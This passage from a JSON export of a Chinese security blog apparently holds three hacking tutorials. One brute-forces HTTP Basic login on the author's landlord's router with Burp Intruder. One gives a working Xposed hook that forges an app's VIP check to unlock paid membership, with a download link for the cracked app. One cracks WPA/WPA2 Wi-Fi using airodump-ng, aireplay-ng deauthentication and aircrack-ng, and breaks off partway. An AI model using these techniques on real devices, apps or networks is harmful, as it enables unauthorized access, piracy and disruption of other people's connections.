![](/images/pasted-60.jpg)\n<br/>\n> 然后到下面的playload Processing,选择add\n\n> 我们需要的处理是把字典中的密码来编码成base64的，于是选择encode\n<br/>\n> ![](/images/pasted-61.jpg)\n<br/>\n> 选择什么样的编码呢？我们选择base64, 当然这里也有其他的编码，urlencode等。\n<br/>\n> ![](/images/pasted-62.jpg)\n<br/>\n>然后start attack，走你\n<br/>\n> ![](/images/pasted-63.jpg)\n<br/>\n> 可以看到密码已经全部经过base64加密了。\n\n","source":"_posts/diary-2017-0404-01.md","raw":"---\nlayout: post\ntitle: burp爆破http Basic认证\ndate: 2017-04-04 19:38:29\ncomments: true\ntags:\n\t- 安全攻防\n---\n\n### 前言\n> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;闲来没事想来看看房东的路由器，来试试使用burp爆破一波,对于如何配置burp就不多说了。\n<br/><!--more-->\n> ![](/images/pasted-62.PNG)\n<br/>\n>不用验证码，很好。\n\n>然后我们来登录看看发的哪些请求\n<br/>\n> ![](/images/pasted-57.jpg)\n\n<br/>\n>看样子密码经过base64加密了\n<br/>\n> ![](/images/pasted-58.jpg)\n\n>可以看到帐号默认admin，然后后面就是我们输入的密码\n\n>于是我输入另一个密码，来看一下编码中密码是从哪儿开始的\n<br/>\n> ![](/images/pasted-59.jpg)\n<br/>\n>知道了编码中那些是密码，然后我们回到burp中，把请求发送到intruder,来配置字典playload\n\n>首先load进字典文件\n<br/>\n> ![](/images/pasted-60.jpg)\n<br/>\n> 然后到下面的playload Processing,选择add\n\n> 我们需要的处理是把字典中的密码来编码成base64的，于是选择encode\n<br/>\n> ![](/images/pasted-61.jpg)\n<br/>\n> 选择什么样的编码呢？我们选择base64, 当然这里也有其他的编码，urlencode等。\n<br/>\n> ![](/images/pasted-62.jpg)\n<br/>\n>然后start attack，走你\n<br/>\n> ![](/images/pasted-63.jpg)\n<br/>\n> 可以看到密码已经全部经过base64加密了。\n\n","slug":"diary-2017-0404-01","published":1,"updated":"2017-05-19T15:31:34.101Z","photos":[],"link":"","_id":"cjvhjxaar000finy2000sr0gl","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><blockquote>\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;闲来没事想来看看房东的路由器，来试试使用burp爆破一波,对于如何配置burp就不多说了。<br><br><a id=\"more\"></a><br><img src=\"/images/pasted-62.PNG\" alt><br><br><br>不用验证码，很好。</p>\n</blockquote>\n<blockquote>\n<p>然后我们来登录看看发的哪些请求<br><br><br><img src=\"/images/pasted-57.jpg\" alt></p>\n</blockquote>\n<p><br></p>\n<blockquote>\n<p>看样子密码经过base64加密了<br><br><br><img src=\"/images/pasted-58.jpg\" alt></p>\n</blockquote>\n<blockquote>\n<p>可以看到帐号默认admin，然后后面就是我们输入的密码</p>\n</blockquote>\n<blockquote>\n<p>于是我输入另一个密码，来看一下编码中密码是从哪儿开始的<br><br><br><img src=\"/images/pasted-59.jpg\" alt><br><br><br>知道了编码中那些是密码，然后我们回到burp中，把请求发送到intruder,来配置字典playload</p>\n</blockquote>\n<blockquote>\n<p>首先load进字典文件<br><br><br><img src=\"/images/pasted-60.jpg\" alt><br><br><br>然后到下面的playload Processing,选择add</p>\n</blockquote>\n<blockquote>\n<p>我们需要的处理是把字典中的密码来编码成base64的，于是选择encode<br><br><br><img src=\"/images/pasted-61.jpg\" alt><br><br><br>选择什么样的编码呢？我们选择base64, 当然这里也有其他的编码，urlencode等。<br><br><br><img src=\"/images/pasted-62.jpg\" alt><br><br><br>然后start attack，走你<br><br><br><img src=\"/images/pasted-63.jpg\" alt><br><br><br>可以看到密码已经全部经过base64加密了。</p>\n</blockquote>\n","site":{"data":{}},"excerpt":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><blockquote>\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;闲来没事想来看看房东的路由器，来试试使用burp爆破一波,对于如何配置burp就不多说了。<br><br>","more":"<br><img src=\"/images/pasted-62.PNG\" alt><br><br><br>不用验证码，很好。</p>\n</blockquote>\n<blockquote>\n<p>然后我们来登录看看发的哪些请求<br><br><br><img src=\"/images/pasted-57.jpg\" alt></p>\n</blockquote>\n<p><br></p>\n<blockquote>\n<p>看样子密码经过base64加密了<br><br><br><img src=\"/images/pasted-58.jpg\" alt></p>\n</blockquote>\n<blockquote>\n<p>可以看到帐号默认admin，然后后面就是我们输入的密码</p>\n</blockquote>\n<blockquote>\n<p>于是我输入另一个密码，来看一下编码中密码是从哪儿开始的<br><br><br><img src=\"/images/pasted-59.jpg\" alt><br><br><br>知道了编码中那些是密码，然后我们回到burp中，把请求发送到intruder,来配置字典playload</p>\n</blockquote>\n<blockquote>\n<p>首先load进字典文件<br><br><br><img src=\"/images/pasted-60.jpg\" alt><br><br><br>然后到下面的playload Processing,选择add</p>\n</blockquote>\n<blockquote>\n<p>我们需要的处理是把字典中的密码来编码成base64的，于是选择encode<br><br><br><img src=\"/images/pasted-61.jpg\" alt><br><br><br>选择什么样的编码呢？我们选择base64, 当然这里也有其他的编码，urlencode等。<br><br><br><img src=\"/images/pasted-62.jpg\" alt><br><br><br>然后start attack，走你<br><br><br><img src=\"/images/pasted-63.jpg\" alt><br><br><br>可以看到密码已经全部经过base64加密了。</p>\n</blockquote>"},{"layout":"post","title":"开发xposed破解模块","date":"2017-03-28T09:13:30.000Z","comments":1,"_content":"\n### 前言\n>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最近发现了一个挺好玩的app，百变语音，就是在qq上可以把自定义的mp3以语音形式发送给好友。app上有很多男女说话的语音供用户下载使用，同时也可以把qq里面别人发的语音下载过来自己用。(当你听到一个甜美的美女声音的时候，背后可能是一个基佬。)\n>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其中还有会员功能，会员功能有更多的语音，并且同时可以在微信中使用。ok让我们来分析一下吧。<!--more-->\n\n\n### 反编译\n>首先来反编译走一波。前面的文章有说道如何反编译，这里就不多说了。\n\n> ![](/images/pasted-50.jpg)\n\n>一个小小的app还有这么多包。翻`AndroidManifest`找入口的`Activity`\n\n> ![](/images/pasted-51.jpg)\n\n> 可以看到，指定了一个路径然后给了a.b，然后获取了包名给了a.g，然后有创建了一个HashMap给q.c，然后然后。。。。(我实在编不下去了。)\n> 这特么是些啥玩意儿，然后我不看这些杂乱无章的代码，找一下关于会员的关键代码，依然找不到任何线索。\n> 这时候突然看到了一个很奇怪的包名\n\n> ![](/images/pasted-52.jpg)\n> ![](/images/pasted-53.jpg)\n\n>进去看依然是被混淆得不成样子的代码。不过为什么要叫iapp呢，于是我百度了一番。\n \n> ![](/images/pasted-54.jpg)\n\n>（这是一款神奇的软件，iApp是一款让你的手机展现放光彩的应用。轻松的操作就可以设计出，你想要的应用界面，你可以分享给你的朋友，传递你的快乐！iApp采用了可视化设计界面，让你设计界面的时候一目了然，不用繁琐的看着代码伤脑筋了！\niApp不是一款简单的应用程序，它是创造应用的应用程序。 如果你没有iApp 你就真的没有iApp！ )\n<br/>\n>嗯，非常好，前者有e4a，现在又出来个iapp。全都是直接拖组件的，怪不得这么多包名。\n\n>于是不看代码了，看看app的网络请求。\n\n> ![](/images/pasted-55.jpg)\n\n>全都是一些注释信息和语音名单。同时把手机的IMEI码上传到了服务器。\n\n>其中的vip.php引起了我的注意。返回 0\n\n>于是我把这个请求使用burp重定向到了本地，返回 1，\n>这个时候奇迹出现了，Duang\n\n> ![](/images/pasted-56.jpg)\n\n直接就成会员了。\n\n### 末尾\n>这个app原理其实很简单，利用了qq的校验不严的漏洞。在录语音的时候会在本地生成已一个语音文件，然后发送给好友就是把这个语音文件发送了出去。然而发送的时候这个语音文件和录语音时生成的语音文件并没有做校验，导致了可以任意发送语音文件。\n\n#### 编写Hook模块。\n> 结论，当访问指定地址的时候如果返回1就是会员。\n> 两种方法。\n> 1,把请求重定向自己的页面，返回1\n> 2,把请求的响应体强制改成1\n\n我们直接来hook网络请求模块，\n```java\nfindAndHookMethod(\"org.apache.http.impl.client.AbstractHttpClient\", lpparam.classLoader, \"execute\", HttpHost.class, HttpRequest.class, HttpContext.class, new XC_MethodHook() {\n    @Override\n    protected void afterHookedMethod(MethodHookParam param) throws Throwable {\n        HttpRequest request = (HttpRequest) param.args[1];\n        if (request instanceof org.apache.http.client.methods.HttpGet) {\n            org.apache.http.client.methods.HttpGet httpGet = (org.apache.http.client.methods.HttpGet) request;\n            if (httpGet.getURI().toString().contains(\"dess.ml/vip/vip.php?imei=\")) {\n                BasicHttpResponse basicHttpResponse = (BasicHttpResponse) param.getResult();\n                basicHttpResponse.setEntity(new StringEntity(\"1\", \"utf-8\"));\n                toast(\"-----破解成功-----\");\n            }\n        }\n    }\n});\n```\n\n> app用的是apache的网络包，当然还有一个java的网络包\n\n\n<br/>\n#### app和模块下载地址\n\n *  [http://pan.baidu.com/s/1skFxIuL](http://pan.baidu.com/s/1skFxIuL) 密码: 8zyj\n\n\n\n\n\n","source":"_posts/diary-2017-0328-01.md","raw":"---\nlayout: post\ntitle: 开发xposed破解模块\ndate: 2017-03-28 17:13:30\ncomments: true\ntags:\n\t- xposed\n\t- 破解\n---\n\n### 前言\n>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最近发现了一个挺好玩的app，百变语音，就是在qq上可以把自定义的mp3以语音形式发送给好友。app上有很多男女说话的语音供用户下载使用，同时也可以把qq里面别人发的语音下载过来自己用。(当你听到一个甜美的美女声音的时候，背后可能是一个基佬。)\n>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其中还有会员功能，会员功能有更多的语音，并且同时可以在微信中使用。ok让我们来分析一下吧。<!--more-->\n\n\n### 反编译\n>首先来反编译走一波。前面的文章有说道如何反编译，这里就不多说了。\n\n> ![](/images/pasted-50.jpg)\n\n>一个小小的app还有这么多包。翻`AndroidManifest`找入口的`Activity`\n\n> ![](/images/pasted-51.jpg)\n\n> 可以看到，指定了一个路径然后给了a.b，然后获取了包名给了a.g，然后有创建了一个HashMap给q.c，然后然后。。。。(我实在编不下去了。)\n> 这特么是些啥玩意儿，然后我不看这些杂乱无章的代码，找一下关于会员的关键代码，依然找不到任何线索。\n> 这时候突然看到了一个很奇怪的包名\n\n> ![](/images/pasted-52.jpg)\n> ![](/images/pasted-53.jpg)\n\n>进去看依然是被混淆得不成样子的代码。不过为什么要叫iapp呢，于是我百度了一番。\n \n> ![](/images/pasted-54.jpg)\n\n>（这是一款神奇的软件，iApp是一款让你的手机展现放光彩的应用。轻松的操作就可以设计出，你想要的应用界面，你可以分享给你的朋友，传递你的快乐！iApp采用了可视化设计界面，让你设计界面的时候一目了然，不用繁琐的看着代码伤脑筋了！\niApp不是一款简单的应用程序，它是创造应用的应用程序。 如果你没有iApp 你就真的没有iApp！ )\n<br/>\n>嗯，非常好，前者有e4a，现在又出来个iapp。全都是直接拖组件的，怪不得这么多包名。\n\n>于是不看代码了，看看app的网络请求。\n\n> ![](/images/pasted-55.jpg)\n\n>全都是一些注释信息和语音名单。同时把手机的IMEI码上传到了服务器。\n\n>其中的vip.php引起了我的注意。返回 0\n\n>于是我把这个请求使用burp重定向到了本地，返回 1，\n>这个时候奇迹出现了，Duang\n\n> ![](/images/pasted-56.jpg)\n\n直接就成会员了。\n\n### 末尾\n>这个app原理其实很简单，利用了qq的校验不严的漏洞。在录语音的时候会在本地生成已一个语音文件，然后发送给好友就是把这个语音文件发送了出去。然而发送的时候这个语音文件和录语音时生成的语音文件并没有做校验，导致了可以任意发送语音文件。\n\n#### 编写Hook模块。\n> 结论，当访问指定地址的时候如果返回1就是会员。\n> 两种方法。\n> 1,把请求重定向自己的页面，返回1\n> 2,把请求的响应体强制改成1\n\n我们直接来hook网络请求模块，\n```java\nfindAndHookMethod(\"org.apache.http.impl.client.AbstractHttpClient\", lpparam.classLoader, \"execute\", HttpHost.class, HttpRequest.class, HttpContext.class, new XC_MethodHook() {\n    @Override\n    protected void afterHookedMethod(MethodHookParam param) throws Throwable {\n        HttpRequest request = (HttpRequest) param.args[1];\n        if (request instanceof org.apache.http.client.methods.HttpGet) {\n            org.apache.http.client.methods.HttpGet httpGet = (org.apache.http.client.methods.HttpGet) request;\n            if (httpGet.getURI().toString().contains(\"dess.ml/vip/vip.php?imei=\")) {\n                BasicHttpResponse basicHttpResponse = (BasicHttpResponse) param.getResult();\n                basicHttpResponse.setEntity(new StringEntity(\"1\", \"utf-8\"));\n                toast(\"-----破解成功-----\");\n            }\n        }\n    }\n});\n```\n\n> app用的是apache的网络包，当然还有一个java的网络包\n\n\n<br/>\n#### app和模块下载地址\n\n *  [http://pan.baidu.com/s/1skFxIuL](http://pan.baidu.com/s/1skFxIuL) 密码: 8zyj\n\n\n\n\n\n","slug":"diary-2017-0328-01","published":1,"updated":"2017-06-18T08:06:14.200Z","photos":[],"link":"","_id":"cjvhjxaar000giny2svz968kl","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><blockquote>\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最近发现了一个挺好玩的app，百变语音，就是在qq上可以把自定义的mp3以语音形式发送给好友。app上有很多男女说话的语音供用户下载使用，同时也可以把qq里面别人发的语音下载过来自己用。(当你听到一个甜美的美女声音的时候，背后可能是一个基佬。)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其中还有会员功能，会员功能有更多的语音，并且同时可以在微信中使用。ok让我们来分析一下吧。<a id=\"more\"></a></p>\n</blockquote>\n<h3 id=\"反编译\"><a href=\"#反编译\" class=\"headerlink\" title=\"反编译\"></a>反编译</h3><blockquote>\n<p>首先来反编译走一波。前面的文章有说道如何反编译，这里就不多说了。</p>\n</blockquote>\n<blockquote>\n<p><img src=\"/images/pasted-50.jpg\" alt></p>\n</blockquote>\n<blockquote>\n<p>一个小小的app还有这么多包。翻<code>AndroidManifest</code>找入口的<code>Activity</code></p>\n</blockquote>\n<blockquote>\n<p><img src=\"/images/pasted-51.jpg\" alt></p>\n</blockquote>\n<blockquote>\n<p>可以看到，指定了一个路径然后给了a.b，然后获取了包名给了a.g，然后有创建了一个HashMap给q.c，然后然后。。。。(我实在编不下去了。)<br>这特么是些啥玩意儿，然后我不看这些杂乱无章的代码，找一下关于会员的关键代码，依然找不到任何线索。<br>这时候突然看到了一个很奇怪的包名</p>\n</blockquote>\n<blockquote>\n<p><img src=\"/images/pasted-52.jpg\" alt><br><img src=\"/images/pasted-53.jpg\" alt></p>\n</blockquote>\n<blockquote>\n<p>进去看依然是被混淆得不成样子的代码。不过为什么要叫iapp呢，于是我百度了一番。</p>\n</blockquote>\n<blockquote>\n<p><img src=\"/images/pasted-54.jpg\" alt></p>\n</blockquote>\n<blockquote>\n<p>（这是一款神奇的软件，iApp是一款让你的手机展现放光彩的应用。轻松的操作就可以设计出，你想要的应用界面，你可以分享给你的朋友，传递你的快乐！iApp采用了可视化设计界面，让你设计界面的时候一目了然，不用繁琐的看着代码伤脑筋了！<br>iApp不是一款简单的应用程序，它是创造应用的应用程序。 如果你没有iApp 你就真的没有iApp！ )<br><br><br>嗯，非常好，前者有e4a，现在又出来个iapp。全都是直接拖组件的，怪不得这么多包名。</p>\n</blockquote>\n<blockquote>\n<p>于是不看代码了，看看app的网络请求。</p>\n</blockquote>\n<blockquote>\n<p><img src=\"/images/pasted-55.jpg\" alt></p>\n</blockquote>\n<blockquote>\n<p>全都是一些注释信息和语音名单。同时把手机的IMEI码上传到了服务器。</p>\n</blockquote>\n<blockquote>\n<p>其中的vip.php引起了我的注意。返回 0</p>\n</blockquote>\n<blockquote>\n<p>于是我把这个请求使用burp重定向到了本地，返回 1，<br>这个时候奇迹出现了，Duang</p>\n</blockquote>\n<blockquote>\n<p><img src=\"/images/pasted-56.jpg\" alt></p>\n</blockquote>\n<p>直接就成会员了。</p>\n<h3 id=\"末尾\"><a href=\"#末尾\" class=\"headerlink\" title=\"末尾\"></a>末尾</h3><blockquote>\n<p>这个app原理其实很简单，利用了qq的校验不严的漏洞。在录语音的时候会在本地生成已一个语音文件，然后发送给好友就是把这个语音文件发送了出去。然而发送的时候这个语音文件和录语音时生成的语音文件并没有做校验，导致了可以任意发送语音文件。</p>\n</blockquote>\n<h4 id=\"编写Hook模块。\"><a href=\"#编写Hook模块。\" class=\"headerlink\" title=\"编写Hook模块。\"></a>编写Hook模块。</h4><blockquote>\n<p>结论，当访问指定地址的时候如果返回1就是会员。<br>两种方法。<br>1,把请求重定向自己的页面，返回1<br>2,把请求的响应体强制改成1</p>\n</blockquote>\n<p>我们直接来hook网络请求模块，<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">findAndHookMethod(<span class=\"string\">\"org.apache.http.impl.client.AbstractHttpClient\"</span>, lpparam.classLoader, <span class=\"string\">\"execute\"</span>, HttpHost.class, HttpRequest.class, HttpContext.class, <span class=\"keyword\">new</span> XC_MethodHook() &#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title\">afterHookedMethod</span><span class=\"params\">(MethodHookParam param)</span> <span class=\"keyword\">throws</span> Throwable </span>&#123;</span><br><span class=\"line\">        HttpRequest request = (HttpRequest) param.args[<span class=\"number\">1</span>];</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (request <span class=\"keyword\">instanceof</span> org.apache.http.client.methods.HttpGet) &#123;</span><br><span class=\"line\">            org.apache.http.client.methods.HttpGet httpGet = (org.apache.http.client.methods.HttpGet) request;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (httpGet.getURI().toString().contains(<span class=\"string\">\"dess.ml/vip/vip.php?imei=\"</span>)) &#123;</span><br><span class=\"line\">                BasicHttpResponse basicHttpResponse = (BasicHttpResponse) param.getResult();</span><br><span class=\"line\">                basicHttpResponse.setEntity(<span class=\"keyword\">new</span> StringEntity(<span class=\"string\">\"1\"</span>, <span class=\"string\">\"utf-8\"</span>));</span><br><span class=\"line\">                toast(<span class=\"string\">\"-----破解成功-----\"</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>app用的是apache的网络包，当然还有一个java的网络包</p>\n</blockquote>\n<p><br></p>\n<h4 id=\"app和模块下载地址\"><a href=\"#app和模块下载地址\" class=\"headerlink\" title=\"app和模块下载地址\"></a>app和模块下载地址</h4><ul>\n<li><a href=\"http://pan.baidu.com/s/1skFxIuL\" target=\"_blank\" rel=\"noopener\">http://pan.baidu.com/s/1skFxIuL</a> 密码: 8zyj</li>\n</ul>\n","site":{"data":{}},"excerpt":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><blockquote>\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最近发现了一个挺好玩的app，百变语音，就是在qq上可以把自定义的mp3以语音形式发送给好友。app上有很多男女说话的语音供用户下载使用，同时也可以把qq里面别人发的语音下载过来自己用。(当你听到一个甜美的美女声音的时候，背后可能是一个基佬。)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其中还有会员功能，会员功能有更多的语音，并且同时可以在微信中使用。ok让我们来分析一下吧。","more":"</p>\n</blockquote>\n<h3 id=\"反编译\"><a href=\"#反编译\" class=\"headerlink\" title=\"反编译\"></a>反编译</h3><blockquote>\n<p>首先来反编译走一波。前面的文章有说道如何反编译，这里就不多说了。</p>\n</blockquote>\n<blockquote>\n<p><img src=\"/images/pasted-50.jpg\" alt></p>\n</blockquote>\n<blockquote>\n<p>一个小小的app还有这么多包。翻<code>AndroidManifest</code>找入口的<code>Activity</code></p>\n</blockquote>\n<blockquote>\n<p><img src=\"/images/pasted-51.jpg\" alt></p>\n</blockquote>\n<blockquote>\n<p>可以看到，指定了一个路径然后给了a.b，然后获取了包名给了a.g，然后有创建了一个HashMap给q.c，然后然后。。。。(我实在编不下去了。)<br>这特么是些啥玩意儿，然后我不看这些杂乱无章的代码，找一下关于会员的关键代码，依然找不到任何线索。<br>这时候突然看到了一个很奇怪的包名</p>\n</blockquote>\n<blockquote>\n<p><img src=\"/images/pasted-52.jpg\" alt><br><img src=\"/images/pasted-53.jpg\" alt></p>\n</blockquote>\n<blockquote>\n<p>进去看依然是被混淆得不成样子的代码。不过为什么要叫iapp呢，于是我百度了一番。</p>\n</blockquote>\n<blockquote>\n<p><img src=\"/images/pasted-54.jpg\" alt></p>\n</blockquote>\n<blockquote>\n<p>（这是一款神奇的软件，iApp是一款让你的手机展现放光彩的应用。轻松的操作就可以设计出，你想要的应用界面，你可以分享给你的朋友，传递你的快乐！iApp采用了可视化设计界面，让你设计界面的时候一目了然，不用繁琐的看着代码伤脑筋了！<br>iApp不是一款简单的应用程序，它是创造应用的应用程序。 如果你没有iApp 你就真的没有iApp！ )<br><br><br>嗯，非常好，前者有e4a，现在又出来个iapp。全都是直接拖组件的，怪不得这么多包名。</p>\n</blockquote>\n<blockquote>\n<p>于是不看代码了，看看app的网络请求。</p>\n</blockquote>\n<blockquote>\n<p><img src=\"/images/pasted-55.jpg\" alt></p>\n</blockquote>\n<blockquote>\n<p>全都是一些注释信息和语音名单。同时把手机的IMEI码上传到了服务器。</p>\n</blockquote>\n<blockquote>\n<p>其中的vip.php引起了我的注意。返回 0</p>\n</blockquote>\n<blockquote>\n<p>于是我把这个请求使用burp重定向到了本地，返回 1，<br>这个时候奇迹出现了，Duang</p>\n</blockquote>\n<blockquote>\n<p><img src=\"/images/pasted-56.jpg\" alt></p>\n</blockquote>\n<p>直接就成会员了。</p>\n<h3 id=\"末尾\"><a href=\"#末尾\" class=\"headerlink\" title=\"末尾\"></a>末尾</h3><blockquote>\n<p>这个app原理其实很简单，利用了qq的校验不严的漏洞。在录语音的时候会在本地生成已一个语音文件，然后发送给好友就是把这个语音文件发送了出去。然而发送的时候这个语音文件和录语音时生成的语音文件并没有做校验，导致了可以任意发送语音文件。</p>\n</blockquote>\n<h4 id=\"编写Hook模块。\"><a href=\"#编写Hook模块。\" class=\"headerlink\" title=\"编写Hook模块。\"></a>编写Hook模块。</h4><blockquote>\n<p>结论，当访问指定地址的时候如果返回1就是会员。<br>两种方法。<br>1,把请求重定向自己的页面，返回1<br>2,把请求的响应体强制改成1</p>\n</blockquote>\n<p>我们直接来hook网络请求模块，<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">findAndHookMethod(<span class=\"string\">\"org.apache.http.impl.client.AbstractHttpClient\"</span>, lpparam.classLoader, <span class=\"string\">\"execute\"</span>, HttpHost.class, HttpRequest.class, HttpContext.class, <span class=\"keyword\">new</span> XC_MethodHook() &#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title\">afterHookedMethod</span><span class=\"params\">(MethodHookParam param)</span> <span class=\"keyword\">throws</span> Throwable </span>&#123;</span><br><span class=\"line\">        HttpRequest request = (HttpRequest) param.args[<span class=\"number\">1</span>];</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (request <span class=\"keyword\">instanceof</span> org.apache.http.client.methods.HttpGet) &#123;</span><br><span class=\"line\">            org.apache.http.client.methods.HttpGet httpGet = (org.apache.http.client.methods.HttpGet) request;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (httpGet.getURI().toString().contains(<span class=\"string\">\"dess.ml/vip/vip.php?imei=\"</span>)) &#123;</span><br><span class=\"line\">                BasicHttpResponse basicHttpResponse = (BasicHttpResponse) param.getResult();</span><br><span class=\"line\">                basicHttpResponse.setEntity(<span class=\"keyword\">new</span> StringEntity(<span class=\"string\">\"1\"</span>, <span class=\"string\">\"utf-8\"</span>));</span><br><span class=\"line\">                toast(<span class=\"string\">\"-----破解成功-----\"</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>app用的是apache的网络包，当然还有一个java的网络包</p>\n</blockquote>\n<p><br></p>\n<h4 id=\"app和模块下载地址\"><a href=\"#app和模块下载地址\" class=\"headerlink\" title=\"app和模块下载地址\"></a>app和模块下载地址</h4><ul>\n<li><a href=\"http://pan.baidu.com/s/1skFxIuL\" target=\"_blank\" rel=\"noopener\">http://pan.baidu.com/s/1skFxIuL</a> 密码: 8zyj</li>\n</ul>"},{"layout":"post","title":"wifi破解之WPA/WPA2抓包跑包","date":"2017-04-12T13:13:22.000Z","comments":1,"_content":"\n\n### 前言\n><font color=\"#ff0000\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！**</font>\n\n\n### 正文\n>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;wifi有很多种方法，这里就说一下Aircrack-ng套件，Aircrack-ng就不多介绍了，一个非常经典的破解套件,也有很多其他的一些软件，水滴，奶瓶，cdlinux等这些就更不多说了，都是基于Aircrack-ng的<!--more-->\n\n##### 扫描ap\n>准备一个无限网卡，然后ifconfig可以看到网卡信息,如果看不到是因为无线网卡没启用就ifconfig -a查看全部无线网卡，可以ifconfig wlan0 up来启用。\n\n> ![](/images/pasted-64.jpg)\n\n> 然后扫描一下附近的ap。\n> * airodump-ng wlan0\n> wlan0是ifconfig的网卡名称，\n> 注意：\n> 我用的是kali2.0，其他版本的可能需要airmon-ng start wlan0把网卡置于监听模式\n\n> ![](/images/pasted-65.jpg)\n\n>下面的STATION为连接AP的客户端，看BSSID来区分客户端属于哪个AP的\n>注意：\n>抓包必须要有客户端连接才可以抓包。\n\n##### 抓握手包\n>扫描到AP信息后来抓包\n> * airodump-ng --bssid EC:88:8F:8A:9C:A0 -w mywifi -c 6 wlan0\n>-bssid 要抓的ap的mac\n>-w 保存的包名\n>-c 信道(就是扫描中的CH)\n>注意：\n>抓包中需要攻击ap，让客户端断线，客户端重新连接ap后才可以抓到包。\n> 可以用aireplay-ng组件来攻击ap\n> * aireplay-ng -0 0 -a EC:88:8F:8A:9C:A0 wlan0\n> -0 冲突攻击模式  \n> -a ap的mac\n\n> ![](/images/pasted-68.jpg)\n\n>抓到握手包后右上角会显示抓到包的客户端mac\n\n> ![](/images/pasted-66.jpg)\n\n##### 跑包\n\n* aircrack-ng -w [字典] [抓到的cap包]\n\n> ![](/images/pasted-67.jpg)","source":"_posts/diary-2017-0412-01.md","raw":"---\nlayout: post\ntitle: wifi破解之WPA/WPA2抓包跑包\ndate: 2017-04-12 21:13:22\ncomments: true\ntags:\n\t- 安全攻防\n\t- wifi破解\n---\n\n\n### 前言\n><font color=\"#ff0000\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！**</font>\n\n\n### 正文\n>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;wifi有很多种方法，这里就说一下Aircrack-ng套件，Aircrack-ng就不多介绍了，一个非常经典的破解套件,也有很多其他的一些软件，水滴，奶瓶，cdlinux等这些就更不多说了，都是基于Aircrack-ng的<!--more-->\n\n##### 扫描ap\n>准备一个无限网卡，然后ifconfig可以看到网卡信息,如果看不到是因为无线网卡没启用就ifconfig -a查看全部无线网卡，可以ifconfig wlan0 up来启用。\n\n> ![](/images/pasted-64.jpg)\n\n> 然后扫描一下附近的ap。\n> * airodump-ng wlan0\n> wlan0是ifconfig的网卡名称，\n> 注意：\n> 我用的是kali2.0，其他版本的可能需要airmon-ng start wlan0把网卡置于监听模式\n\n> ![](/images/pasted-65.jpg)\n\n>下面的STATION为连接AP的客户端，看BSSID来区分客户端属于哪个AP的\n>注意：\n>抓包必须要有客户端连接才可以抓包。\n\n##### 抓握手包\n>扫描到AP信息后来抓包\n> * airodump-ng --bssid EC:88:8F:8A:9C:A0 -w mywifi -c 6 wlan0\n>-bssid 要抓的ap的mac\n>-w 保存的包名\n>-c 信道(就是扫描中的CH)\n>注意：\n>抓包中需要攻击ap，让客户端断线，客户端重新连接ap后才可以抓到包。\n> 可以用aireplay-ng组件来攻击ap\n> * aireplay-ng -0 0 -a EC:88:8F:8A:9C:A0 wlan0\n> -0 冲突攻击模式  \n> -a ap的mac\n\n> 